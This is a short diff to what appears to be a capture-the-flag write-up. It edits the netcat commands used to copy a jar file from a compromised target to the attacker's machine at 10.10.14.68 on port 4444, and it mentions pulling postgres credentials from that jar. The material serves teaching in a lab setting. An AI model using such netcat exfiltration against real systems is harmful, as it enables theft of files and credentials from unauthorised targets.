@@ -149,12 +149,12 @@ It seems the user flag is in the user josh’s home directory. There is a jar fi
 To carry out the analysis, I transfer the file from target machine to my pc using netcat.
 
 ```bash
-# On Target machine.
-nc -l -p pick_a_port < cloudhosting-0.0.1.jar
+# On attacking machine (Destination).
+nc -l -p  4444 > cloudhosting-0.0.1.jar
 ```
 ```bash
-# On the attacking machine
-nc ip_of_target port_of_target > ch.jar
+# On Target machine (Source).
+nc 10.10.14.68 4444 < cloudhosting-0.0.1.jar
 ```
 I opened the jar file using JD_GUI and looking around I was able to retrive postgress credentials.
 
